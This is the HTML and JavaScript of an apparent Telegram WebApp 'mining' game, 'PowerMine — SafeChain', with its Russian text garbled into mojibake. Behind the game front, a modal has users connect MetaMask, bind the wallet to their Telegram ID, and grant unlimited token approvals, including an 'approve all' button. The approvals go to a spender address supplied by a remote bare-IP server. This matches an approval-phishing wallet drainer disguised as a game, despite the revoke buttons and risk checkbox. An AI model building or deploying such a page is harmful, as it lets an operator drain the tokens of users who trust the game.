<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>üíé PowerMine ‚Äî SafeChain</title>

    <!-- –¢–≤–æ–π —Å—Ç–∏–ª—å/–∞–Ω–∏–º–∞—Ü–∏–∏ –º–∞–π–Ω–µ—Ä–∞ -->
    <link rel="stylesheet" href="https://erahozoqu763.github.io/maker/mainer.css" />

    <!-- Telegram WebApp SDK (–¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è tg_user_id –≤ –±–æ—Ç–µ) -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <!-- ethers v6 –¥–ª—è MetaMask -->
    <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.2/dist/ethers.min.js"></script>

    <!-- –í–∏–∑—É–∞–ª –º–∞–π–Ω–µ—Ä–∞ (—Å–∫–æ—Ä–æ—Å—Ç—å/–∑–∞—Ä—è–¥/–ª–æ–∫–∞–ª—å–Ω–æ–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ) -->
    <script src="https://erahozoqu763.github.io/maker/mainer.js" defer></script>

    <style>
        /* –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —Å—Ç–∏–ª–∏ */
        .web3-topbar {
            max-width: 980px;
            margin: 16px auto 0;
            padding: 10px 14px;
            display: flex;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
        }
        .web3-btn {
            padding: 8px 12px;
            border-radius: 10px;
            border: 1px solid rgba(255,255,255,0.2);
            background: rgba(255,255,255,0.06);
            color: #fff;
            cursor: pointer;
        }
        .web3-btn[disabled] { opacity: 0.55; cursor: default; }
        .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace; }
        .muted { color: #9aa3b2; }
        .ok { color: #36c692; }
        .warn { color: #ffcc66; }
        .err { color: #ff6b6b; }

        /* –ú–æ–¥–∞–ª–∫–∞ */
        .modal-backdrop {
            position: fixed; inset: 0;
            background: rgba(0,0,0,0.55);
            display: none;
            align-items: center; justify-content: center;
            z-index: 1000;
        }
        .modal-backdrop.show { display: flex; }
        .modal {
            width: min(940px, 94vw);
            max-height: 92vh;
            background: rgba(17,20,28,0.98);
            border: 1px solid rgba(255,255,255,0.08);
            border-radius: 14px;
            overflow: hidden;
            display: grid;
            grid-template-rows: auto 1fr auto;
        }
        .modal-header, .modal-footer {
            padding: 12px 16px;
            border-bottom: 1px solid rgba(255,255,255,0.08);
        }
        .modal-footer { border-top: 1px solid rgba(255,255,255,0.08); border-bottom: none; }
        .modal-title { font-weight: 700; }
        .modal-close {
            margin-left: auto;
            background: transparent; border: none; color: #fff; cursor: pointer; font-size: 1.2rem;
        }
        .modal-body { padding: 12px 16px; overflow: auto; }
        .stepper { display: flex; gap: 6px; margin-top: 6px; flex-wrap: wrap; }
        .step {
            padding: 6px 10px; border-radius: 999px;
            border: 1px solid rgba(255,255,255,0.15);
            color: #c7cede;
        }
        .step.active { background: rgba(124,156,255,0.18); border-color: rgba(124,156,255,0.45); }

        /* –¢–∞–±–ª–∏—Ü–∞ —Ç–æ–∫–µ–Ω–æ–≤ */
        .tokens {
            display: grid;
            grid-template-columns: 3fr 1fr 1fr 2fr;
            gap: 8px;
        }
        .tokens .row { display: contents; }
        .tokens .row > div { padding: 8px 6px; border-bottom: 1px dashed #2a2f45; }
        .tokens .head > div { color: #9aa3b2; font-size: 0.9rem; }
        .btn-xs { padding: 6px 10px; font-size: 0.9rem; }

        .confirm {
            margin-top: 10px; padding: 10px; border-radius: 10px;
            background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.08);
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>üíé PowerMine</h1>
            <p class="subtitle">–ú–∞–π–Ω—å SC –∏ —É—Å–∫–æ—Ä—è–π —Å–≤–æ–π –¥–æ—Ö–æ–¥</p>
        </header>

        <!-- –í–µ—Ä—Ö–Ω—è—è –ø–∞–Ω–µ–ª—å: –∫–Ω–æ–ø–∫–∞ –≤—ã–∑—ã–≤–∞–µ—Ç –º–æ–¥–∞–ª–∫—É -->
        <div class="web3-topbar">
            <button id="btnOpenModal" class="web3-btn">üîó –ü–æ–¥–∫–ª—é—á–∏—Ç—å –∫–æ—à–µ–ª—ë–∫</button>
            <span id="miniState" class="muted">‚Äî</span>
        </div>

        <!-- –ü–∞–Ω–µ–ª—å –º–∞–π–Ω–µ—Ä–∞ (–∫–∞–∫ –≤ —Ç–≤–æ—ë–º –º–∞–∫–µ—Ç–µ) -->
        <div class="miner-panel">
            <div class="fan-container">
                <img id="fanImg" src="https://erahozoqu763.github.io/maker/img/mainer.png" alt="SafeChain –ú–∞–π–Ω–µ—Ä" draggable="false" />
                <div class="charge-indicator">
                    <span id="chargePercent">100%</span>
                </div>
            </div>

            <div class="stats">
                <div class="stat">
                    <span>‚ö° –°–∫–æ—Ä–æ—Å—Ç—å:</span>
                    <b id="speed">0.000000001</b> <small>SC/—Å–µ–∫</small>
                </div>
                <div class="stat">
                    <span>‚õèÔ∏è –ù–∞–º–∞–π–Ω–µ–Ω–æ:</span>
                    <b id="mined">0</b> <small>SC</small>
                </div>
                <div class="stat">
                    <span>üí∞ –ë–∞–ª–∞–Ω—Å:</span>
                    <b id="balance">0</b> <small>SC</small>
                </div>
                <div class="stat">
                    <span>üîã –ë—É—Å—Ç:</span>
                    <b id="boost">x1</b>
                </div>
            </div>

            <div class="progress-container">
                <label>–ó–∞—Ä—è–¥ –º–∞–π–Ω–µ—Ä–∞:</label>
                <div class="progress-bar">
                    <div id="chargeBar" class="progress"></div>
                </div>
            </div>

            <div class="actions">
                <button id="charge" class="btn btn-green">üîã –ó–∞—Ä—è–¥–∏—Ç—å –º–∞–π–Ω–µ—Ä</button>
                <button id="upgrade" class="btn btn-accent">‚ö° –£—Å–∫–æ—Ä–∏—Ç—å</button>
            </div>

            <p class="hint">‚è≥ –ú–∞–π–Ω–∏–Ω–≥ –ø—Ä–æ–¥–æ–ª–∂–∞–µ—Ç—Å—è –¥–∞–∂–µ –ø–æ—Å–ª–µ –∑–∞–∫—Ä—ã—Ç–∏—è WebApp ‚Äî –¥–∞–Ω–Ω—ã–µ —Å–æ—Ö—Ä–∞–Ω—è—é—Ç—Å—è –ª–æ–∫–∞–ª—å–Ω–æ.</p>
        </div>
    </div>

    <!-- üî≥ –ú–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ -->
    <div id="modalWrap" class="modal-backdrop" aria-hidden="true">
        <div class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
            <div class="modal-header" style="display:flex;align-items:center;gap:10px;">
                <div class="modal-title" id="modalTitle">–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞ –∏ –ø—Ä–∏–≤—è–∑–∫–∞</div>
                <button id="btnCloseModal" class="modal-close" aria-label="–ó–∞–∫—Ä—ã—Ç—å">‚úï</button>
            </div>
            <div class="modal-body">
                <div class="stepper">
                    <div id="s1" class="step active">1. MetaMask</div>
                    <div id="s2" class="step">2. –ü–æ–¥–ø–∏—Å—å –ø—Ä–∏–≤—è–∑–∫–∏</div>
                    <div id="s3" class="step">3. Approve / Revoke</div>
                </div>

                <!-- Step 1 -->
                <section id="step1" style="margin-top:10px;">
                    <p class="muted">–ü–æ–¥–∫–ª—é—á–∏ MetaMask –∏ —É–±–µ–¥–∏—Å—å, —á—Ç–æ —Å–µ—Ç—å —Å–æ–≤–ø–∞–¥–∞–µ—Ç —Å –∫–æ–Ω—Ñ–∏–≥–æ–º API.</p>
                    <div style="display:flex;gap:8px;flex-wrap:wrap;margin:8px 0;">
                        <button id="btnConnect" class="web3-btn">üîó –ü–æ–¥–∫–ª—é—á–∏—Ç—å MetaMask</button>
                        <button id="btnDisconnect" class="web3-btn" disabled>‚èèÔ∏è –û—Ç–∫–ª—é—á–∏—Ç—å</button>
                        <span id="netInfo" class="muted">chainId: ‚Äî</span>
                    </div>

                    <div style="display:grid;grid-template-columns: 1fr 1fr;gap:8px;">
                        <div>
                            <div class="muted">–ê–¥—Ä–µ—Å:</div>
                            <div id="addr" class="mono">‚Äî</div>
                        </div>
                        <div>
                            <div class="muted">SPENDER (–∏–∑ API):</div>
                            <div id="cfgSpender" class="mono">‚Äî</div>
                        </div>
                        <div>
                            <div class="muted">Chain ID (–∏–∑ API):</div>
                            <div id="cfgChainId" class="mono">‚Äî</div>
                        </div>
                        <div>
                            <div class="muted">API:</div>
                            <div id="cfgApi" class="mono">‚Äî</div>
                        </div>
                    </div>
                    <div id="state1" class="mono muted" style="margin-top:8px;">‚Äî</div>
                    <div style="margin-top:10px;">
                        <button id="toStep2" class="web3-btn" disabled>–î–∞–ª–µ–µ ‚Üí</button>
                    </div>
                </section>

                <!-- Step 2 -->
                <section id="step2" style="display:none;margin-top:10px;">
                    <p class="muted">–ü–æ–¥–ø–∏—à–∏ —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è –ø—Ä–∏–≤—è–∑–∫–∏ –∫–æ—à–µ–ª—å–∫–∞ –∫ —Ç–≤–æ–µ–º—É Telegram ID (–±–µ–∑ seed/PK).</p>
                    <div>
                        <div class="muted">Telegram ID:</div>
                        <div id="tgIdView" class="mono">‚Äî</div>
                    </div>
                    <div class="confirm">
                        <div><b>–ü—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä —Å–æ–æ–±—â–µ–Ω–∏—è:</b></div>
                        <pre id="msgPreview" class="mono" style="white-space:pre-wrap;">‚Äî</pre>
                    </div>
                    <div style="margin-top:10px;display:flex;gap:8px;flex-wrap:wrap;">
                        <button id="btnBind" class="web3-btn" disabled>‚úçÔ∏è –ü–æ–¥–ø–∏—Å–∞—Ç—å –∏ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å</button>
                        <span id="bindState" class="mono muted">‚Äî</span>
                    </div>
                    <div style="margin-top:10px;">
                        <button id="toStep3" class="web3-btn" disabled>–î–∞–ª–µ–µ ‚Üí</button>
                        <button id="backTo1" class="web3-btn">‚Üê –ù–∞–∑–∞–¥</button>
                    </div>
                </section>

                <!-- Step 3 -->
                <section id="step3" style="display:none;margin-top:10px;">
                    <p class="muted">
                        –£–ø—Ä–∞–≤–ª—è–π —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è–º–∏ –¥–ª—è —Ç–æ–∫–µ–Ω–æ–≤ –∏–∑ allowlist (tokens.json –Ω–∞ –±—ç–∫–µ).
                        <br/>–í–∏–¥–Ω–æ —Ç–µ–∫—É—â–∏–π <b>allowance ‚Üí SPENDER</b>. –ú–æ–∂–Ω–æ –≤—ã–¥–∞—Ç—å <b>Approve ‚àû</b> –∏–ª–∏ —Å–¥–µ–ª–∞—Ç—å <b>Revoke (0)</b>.
                    </p>

                    <div id="tokensWrap">
                        <div class="muted">–ó–∞–≥—Ä—É–∂–∞—é —Å–ø–∏—Å–æ–∫ —Ç–æ–∫–µ–Ω–æ–≤‚Ä¶</div>
                    </div>

                    <div class="confirm">
                        <label style="display:flex;gap:8px;align-items:center;">
                            <input type="checkbox" id="ackRisks" />
                            <span>–Ø –ø–æ–Ω–∏–º–∞—é —Ä–∏—Å–∫–∏ <b>Approve Unlimited</b>: SPENDER —Å–º–æ–∂–µ—Ç –ø–µ—Ä–µ–≤–æ–¥–∏—Ç—å –º–æ–∏ —Ç–æ–∫–µ–Ω—ã –≤ –ø—Ä–µ–¥–µ–ª–∞—Ö allowance –¥–æ –æ—Ç–∑—ã–≤–∞.</span>
                        </label>
                        <div style="margin-top:8px;display:flex;gap:8px;flex-wrap:wrap;">
                            <button id="btnApproveAll" class="web3-btn" disabled>Approve ‚àû –¥–ª—è –≤—Å–µ—Ö</button>
                            <button id="btnRevokeAll" class="web3-btn">Revoke (0) –¥–ª—è –≤—Å–µ—Ö</button>
                            <span id="bulkState" class="mono muted">‚Äî</span>
                        </div>
                    </div>

                    <div style="margin-top:10px;">
                        <button id="backTo2" class="web3-btn">‚Üê –ù–∞–∑–∞–¥</button>
                        <button id="closeModal" class="web3-btn">–ì–æ—Ç–æ–≤–æ</button>
                    </div>
                </section>
            </div>
            <div class="modal-footer">
                <span class="muted">SafeChain ‚Ä¢ –æ–ø–µ—Ä–∞—Ü–∏–∏ –≤—ã–ø–æ–ª–Ω—è—é—Ç—Å—è —Ç–æ–ª—å–∫–æ —Å —Ç–≤–æ–µ–≥–æ –∫–æ—à–µ–ª—å–∫–∞ –∏ –ø–æ —Ç–≤–æ–µ–º—É –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—é –≤ MetaMask</span>
            </div>
        </div>
    </div>

    <script>
        /* ===== –ù–∞—Å—Ç—Ä–æ–π–∫–∏ ===== */
        const API_BASE_URL = "https://api.103.246.147.200.sslip.io"; // ‚Üê –ü–û–î–ú–ï–ù–ò –ù–ê –°–í–û–ô –ü–£–ë–õ–ò–ß–ù–´–ô API URL

        /* ===== –°–æ—Å—Ç–æ—è–Ω–∏–µ ===== */
        const STATE = {
            provider: null,
            signer: null,
            account: null,
            chainId: null,
            config: null,
            tokensMeta: new Map(), // addr -> {symbol, decimals}
        };

        /* ===== –£—Ç–∏–ª–∏—Ç—ã DOM ===== */
        function el(id) { return document.getElementById(id); }
        function showStep(n) {
            // –ø–æ–¥—Å–≤–µ—Ç–∫–∞
            ["s1","s2","s3"].forEach((id,i) => el(id).classList.toggle("active", i === (n-1)));
            // –≤–∏–¥–∏–º–æ—Å—Ç—å —Å–µ–∫—Ü–∏–π
            el("step1").style.display = n === 1 ? "block" : "none";
            el("step2").style.display = n === 2 ? "block" : "none";
            el("step3").style.display = n === 3 ? "block" : "none";
        }
        function openModal() {
            el("modalWrap").classList.add("show");
            el("modalWrap").setAttribute("aria-hidden", "false");
            showStep(1);
        }
        function closeModal() {
            el("modalWrap").classList.remove("show");
            el("modalWrap").setAttribute("aria-hidden", "true");
        }

        /* ===== API ===== */
        async function apiGet(path, params = null) {
            let url = new URL(API_BASE_URL + path);
            if (params) Object.entries(params).forEach(([k,v]) => url.searchParams.set(k, v));
            const r = await fetch(url.toString(), { credentials: "omit" });
            if (!r.ok) throw new Error("API " + path + " failed: " + r.status);
            return r.json();
        }
        async function apiPost(path, body = {}) {
            const r = await fetch(API_BASE_URL + path, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(body)
            });
            if (!r.ok) throw new Error("API " + path + " failed: " + r.status);
            return r.json();
        }

        /* ===== Telegram ID ===== */
        function tgUserId() {
            try {
                if (window.Telegram && Telegram.WebApp && Telegram.WebApp.initDataUnsafe?.user?.id) {
                    return Number(Telegram.WebApp.initDataUnsafe.user.id);
                }
            } catch (_) {}
            const q = new URLSearchParams(location.search);
            const v = q.get("tg_user_id");
            return v ? Number(v) : null;
        }

        /* ===== ERC20 ===== */
        const ERC20_ABI = [
            { name:"symbol",   type:"function", stateMutability:"view", inputs:[], outputs:[{type:"string"}] },
            { name:"decimals", type:"function", stateMutability:"view", inputs:[], outputs:[{type:"uint8"}] },
            { name:"balanceOf",type:"function", stateMutability:"view", inputs:[{name:"owner",type:"address"}], outputs:[{type:"uint256"}] },
            { name:"allowance",type:"function", stateMutability:"view", inputs:[{name:"owner",type:"address"},{name:"spender",type:"address"}], outputs:[{type:"uint256"}] },
            { name:"approve",  type:"function", stateMutability:"nonpayable", inputs:[{name:"spender",type:"address"},{name:"amount",type:"uint256"}], outputs:[{type:"bool"}] },
        ];
        async function tokenMeta(addr) {
            addr = ethers.getAddress(addr);
            if (STATE.tokensMeta.has(addr)) return STATE.tokensMeta.get(addr);
            const c = new ethers.Contract(addr, ERC20_ABI, STATE.provider);
            let symbol = "?", decimals = 18;
            try { symbol = await c.symbol(); } catch {}
            try { decimals = Number(await c.decimals()); } catch {}
            const meta = { symbol, decimals };
            STATE.tokensMeta.set(addr, meta);
            return meta;
        }
        function fmtAmount(raw, decimals) {
            try { return Number(BigInt(raw)) / 10 ** Number(decimals); } catch { return 0; }
        }

        /* ===== –ö–æ–Ω—Ñ–∏–≥ ===== */
        async function loadConfig() {
            const cfg = await apiGet("/api/config");
            STATE.config = cfg;
            el("cfgSpender").textContent = cfg.spender;
            el("cfgChainId").textContent = String(cfg.chainId);
            el("cfgApi").textContent = API_BASE_URL;
        }

        /* ===== MetaMask connect ===== */
        async function connect() {
            if (!window.ethereum) {
                alert("MetaMask –Ω–µ –Ω–∞–π–¥–µ–Ω. –£—Å—Ç–∞–Ω–æ–≤–∏ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ –∏–ª–∏ –æ—Ç–∫—Ä–æ–π –≤ –±—Ä–∞—É–∑–µ—Ä–µ —Å –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π –∫–æ—à–µ–ª—å–∫–∞.");
                return;
            }
            STATE.provider = new ethers.BrowserProvider(window.ethereum);
            await window.ethereum.request({ method: "eth_requestAccounts" });
            STATE.signer = await STATE.provider.getSigner();
            STATE.account = await STATE.signer.getAddress();
            const net = await STATE.provider.getNetwork();
            STATE.chainId = Number(net.chainId);

            el("addr").textContent = STATE.account;
            el("netInfo").textContent = "chainId=" + STATE.chainId;
            el("btnDisconnect").disabled = false;

            el("state1").textContent = "‚úÖ –ü–æ–¥–∫–ª—é—á–µ–Ω–æ. –£–±–µ–¥–∏—Å—å, —á—Ç–æ —Å–µ—Ç—å —Å–æ–≤–ø–∞–¥–∞–µ—Ç —Å Chain ID –∏–∑ API.";
            el("miniState").textContent = "–ü–æ–¥–∫–ª—é—á–µ–Ω–æ: " + STATE.account.slice(0,6) + "‚Ä¶" + STATE.account.slice(-4);

            // –ü–æ–¥–∫–ª—é—á–∏–ª–∞—Å—å ‚Äî —Ä–∞–∑—Ä–µ—à–∏–º –ø–µ—Ä–µ—Ö–æ–¥ –∫ —à–∞–≥—É 2
            el("toStep2").disabled = false;

            // –ü—Ä–æ–≤–µ—Ä–∏–º —Å–µ—Ç—å
            if (STATE.config && STATE.chainId !== Number(STATE.config.chainId)) {
                try {
                    await window.ethereum.request({
                        method: "wallet_switchEthereumChain",
                        params: [{ chainId: ethers.toBeHex(Number(STATE.config.chainId)) }],
                    });
                    const n2 = await STATE.provider.getNetwork();
                    STATE.chainId = Number(n2.chainId);
                    el("netInfo").textContent = "chainId=" + STATE.chainId;
                } catch (e) {
                    el("state1").innerHTML = "‚ö†Ô∏è <span class='warn'>–°–µ—Ç—å –∫–æ—à–µ–ª—å–∫–∞ –Ω–µ —Å–æ–≤–ø–∞–¥–∞–µ—Ç —Å –∫–æ–Ω—Ñ–∏–≥–æ–º. –ú–æ–∂–Ω–æ –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å, –Ω–æ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –º–æ–≥—É—Ç –Ω–µ –ø—Ä–æ–π—Ç–∏.</span>";
                }
            }
        }
        async function disconnect() {
            STATE.provider = null; STATE.signer = null; STATE.account = null; STATE.chainId = null;
            el("addr").textContent = "‚Äî"; el("netInfo").textContent = "chainId: ‚Äî";
            el("btnDisconnect").disabled = true;
            el("state1").textContent = "–û—Ç–∫–ª—é—á–µ–Ω–æ.";
            el("miniState").textContent = "‚Äî";
            el("toStep2").disabled = true;
            el("btnBind").disabled = true;
            el("toStep3").disabled = true;
        }

        /* ===== Bind (SIWE-like) ===== */
        function buildBindMessage(tgId, address) {
            const now = new Date().toISOString();
            const nonce = Math.random().toString(36).slice(2);
            return `SafeChain Wallet Bind

Bind Telegram ID: ${tgId}
Address: ${address}
ChainId: ${STATE.chainId}
Timestamp: ${now}
Nonce: ${nonce}`;
        }
        async function prepareStep2() {
            const id = tgUserId();
            el("tgIdView").textContent = id ? String(id) : "‚Äî";
            if (!STATE.account || !id) {
                el("btnBind").disabled = true;
                el("bindState").textContent = "–¢—Ä–µ–±—É–µ—Ç—Å—è –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã–π –∫–æ—à–µ–ª—ë–∫ –∏ Telegram ID (–æ—Ç–∫—Ä–æ–π —á–µ—Ä–µ–∑ WebApp –∫–Ω–æ–ø–∫–æ–π –≤ –±–æ—Ç–µ).";
            } else {
                const msg = buildBindMessage(id, STATE.account);
                el("msgPreview").textContent = msg;
                el("btnBind").disabled = false;
            }
        }
        async function signAndBind() {
            const id = tgUserId();
            if (!id) { el("bindState").innerHTML = "‚ö†Ô∏è <span class='warn'>–ù–µ –Ω–∞–π–¥–µ–Ω Telegram ID.</span>"; return; }
            if (!STATE.signer || !STATE.account) { alert("–°–Ω–∞—á–∞–ª–∞ –ø–æ–¥–∫–ª—é—á–∏ –∫–æ—à–µ–ª—ë–∫."); return; }

            const msg = buildBindMessage(id, STATE.account);
            let sig;
            try {
                sig = await STATE.signer.signMessage(msg);
            } catch {
                el("bindState").innerHTML = "‚ùå <span class='err'>–ü–æ–¥–ø–∏—Å—å –æ—Ç–∫–ª–æ–Ω–µ–Ω–∞.</span>";
                return;
            }
            try {
                const res = await apiPost("/api/bind", {
                    tg_user_id: Number(id),
                    address: STATE.account,
                    message: msg,
                    signature: sig
                });
                if (res && res.ok) {
                    el("bindState").innerHTML = "‚úÖ <span class='ok'>–ü—Ä–∏–≤—è–∑–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∞ –Ω–∞ –±—ç–∫–µ–Ω–¥–µ.</span>";
                    el("toStep3").disabled = false;
                } else {
                    el("bindState").innerHTML = "‚ö†Ô∏è <span class='warn'>–û—Ç–≤–µ—Ç API –±–µ–∑ ok=true.</span>";
                }
            } catch (e) {
                el("bindState").innerHTML = "‚ùå <span class='err'>–û—à–∏–±–∫–∞ API bind: " + (e.message || e) + "</span>";
            }
        }

        /* ===== Tokens / Approve ===== */
        async function loadTokensTable() {
            const wrap = el("tokensWrap");
            if (!STATE.provider || !STATE.account || !STATE.config) {
                wrap.innerHTML = "<div class='muted'>–ü–æ–¥–∫–ª—é—á–∏ –∫–æ—à–µ–ª—ë–∫ –∏ –∫–æ–Ω—Ñ–∏–≥.</div>";
                return;
            }
            const owner = STATE.account;
            const spender = STATE.config.spender;
            const rows = [];

            for (const t of STATE.config.tokens) {
                const addr = ethers.getAddress(t);
                const c = new ethers.Contract(addr, ERC20_ABI, STATE.provider);
                const meta = await tokenMeta(addr);
                let bal = 0n, allow = 0n;
                try { bal = await c.balanceOf(owner); } catch {}
                try { allow = await c.allowance(owner, spender); } catch {}
                rows.push({
                    token: addr,
                    symbol: meta.symbol,
                    decimals: meta.decimals,
                    balanceHuman: fmtAmount(bal, meta.decimals),
                    allowanceHuman: fmtAmount(allow, meta.decimals),
                });
            }

            const html = [
                "<div class='tokens'>",
                "<div class='row head'><div>–¢–æ–∫–µ–Ω</div><div>–ë–∞–ª–∞–Ω—Å</div><div>Allowance ‚Üí SPENDER</div><div>–î–µ–π—Å—Ç–≤–∏—è</div></div>",
                ...rows.map(r => {
                    return `<div class="row">
                        <div><span class="mono">${r.symbol}</span><br/><span class="mono" style="font-size:.8rem;">${r.token}</span></div>
                        <div>${r.balanceHuman.toFixed(6)}</div>
                        <div>${r.allowanceHuman.toFixed(6)}</div>
                        <div style="display:flex;gap:6px;flex-wrap:wrap;">
                            <button class="web3-btn btn-xs" data-act="approve" data-token="${r.token}">Approve ‚àû</button>
                            <button class="web3-btn btn-xs" data-act="revoke" data-token="${r.token}">Revoke (0)</button>
                        </div>
                    </div>`;
                }),
                "</div>"
            ].join("");
            wrap.innerHTML = html;

            wrap.querySelectorAll("button[data-act]").forEach(btn => {
                btn.addEventListener("click", async () => {
                    const token = btn.getAttribute("data-token");
                    const act = btn.getAttribute("data-act");
                    btn.disabled = true;
                    try {
                        if (act === "approve") await approveUnlimited(token);
                        else await revokeZero(token);
                        await loadTokensTable();
                    } catch (e) {
                        alert("–û—à–∏–±–∫–∞: " + (e.message || e));
                    } finally {
                        btn.disabled = false;
                    }
                });
            });
        }
        async function approveUnlimited(tokenAddr) {
            await ensureRightChain();
            const spender = STATE.config.spender;
            const c = new ethers.Contract(tokenAddr, ERC20_ABI, STATE.signer);
            const tx = await c.approve(spender, ethers.MaxUint256);
            await tx.wait();
        }
        async function revokeZero(tokenAddr) {
            await ensureRightChain();
            const spender = STATE.config.spender;
            const c = new ethers.Contract(tokenAddr, ERC20_ABI, STATE.signer);
            const tx = await c.approve(spender, 0n);
            await tx.wait();
        }
        async function approveAll() {
            if (!el("ackRisks").checked) { alert("–ü–æ–¥—Ç–≤–µ—Ä–¥–∏ —á–µ–∫–±–æ–∫—Å –æ —Ä–∏—Å–∫–∞—Ö."); return; }
            const tokens = STATE.config?.tokens || [];
            for (const t of tokens) {
                try { await approveUnlimited(t); } catch (e) { el("bulkState").textContent = "–û—à–∏–±–∫–∞ –Ω–∞ " + t.slice(0,8) + "‚Ä¶"; }
            }
            el("bulkState").textContent = "–ì–æ—Ç–æ–≤–æ.";
            await loadTokensTable();
        }
        async function revokeAll() {
            const tokens = STATE.config?.tokens || [];
            for (const t of tokens) {
                try { await revokeZero(t); } catch (e) { el("bulkState").textContent = "–û—à–∏–±–∫–∞ –Ω–∞ " + t.slice(0,8) + "‚Ä¶"; }
            }
            el("bulkState").textContent = "–ì–æ—Ç–æ–≤–æ.";
            await loadTokensTable();
        }

        /* ===== Chain helper ===== */
        async function ensureRightChain() {
            if (!STATE.config) return;
            const need = Number(STATE.config.chainId);
            if (STATE.chainId === need) return;
            try {
                await window.ethereum.request({ method:"wallet_switchEthereumChain", params:[{ chainId: ethers.toBeHex(need) }] });
                const net = await STATE.provider.getNetwork();
                STATE.chainId = Number(net.chainId);
                el("netInfo").textContent = "chainId=" + STATE.chainId;
            } catch {}
        }

        /* ===== Bootstrap / —Å–æ–±—ã—Ç–∏—è ===== */
        document.addEventListener("DOMContentLoaded", async () => {
            // –ó–∞–≥—Ä—É–∑–∏–º –∫–æ–Ω—Ñ–∏–≥ —Å—Ä–∞–∑—É
            try { await loadConfig(); } catch { /* –ø–æ–∫–∞–∂–µ–º –ø–æ–∑–∂–µ –≤ UI */ }

            // –ö–Ω–æ–ø–∫–∏ –º–æ–¥–∞–ª–∫–∏
            el("btnOpenModal").addEventListener("click", openModal);
            el("btnCloseModal").addEventListener("click", closeModal);
            el("closeModal").addEventListener("click", closeModal);
            // –ó–∞–∫—Ä—ã—Ç–∏–µ –ø–æ —Ñ–æ–Ω—É
            el("modalWrap").addEventListener("click", (e) => { if (e.target === el("modalWrap")) closeModal(); });

            // Step 1
            el("btnConnect").addEventListener("click", connect);
            el("btnDisconnect").addEventListener("click", disconnect);
            el("toStep2").addEventListener("click", async () => {
                showStep(2);
                await prepareStep2();
            });

            // Step 2
            el("btnBind").addEventListener("click", signAndBind);
            el("backTo1").addEventListener("click", () => showStep(1));
            el("toStep3").addEventListener("click", async () => {
                showStep(3);
                await loadTokensTable();
            });

            // Step 3
            el("backTo2").addEventListener("click", () => showStep(2));
            el("ackRisks").addEventListener("change", () => {
                el("btnApproveAll").disabled = !el("ackRisks").checked;
            });
            el("btnApproveAll").addEventListener("click", approveAll);
            el("btnRevokeAll").addEventListener("click", revokeAll);

            // –ü–æ—è—Å–Ω–µ–Ω–∏–µ —Å–æ—Å—Ç–æ—è–Ω–∏—è –≤ –º–∏–Ω–∏-–±–∞—Ä–µ
            const id = tgUserId();
            if (id) {
                el("miniState").textContent = "–û—Ç–∫—Ä—ã—Ç–æ –∏–∑ Telegram WebApp ‚Ä¢ ID " + id;
            } else {
                el("miniState").textContent = "–û—Ç–∫—Ä–æ–π —á–µ—Ä–µ–∑ –∫–Ω–æ–ø–∫—É WebApp –≤ –±–æ—Ç–µ (–∏–ª–∏ –¥–æ–±–∞–≤—å ?tg_user_id=...)";
            }
        });
    </script>
</body>
</html>
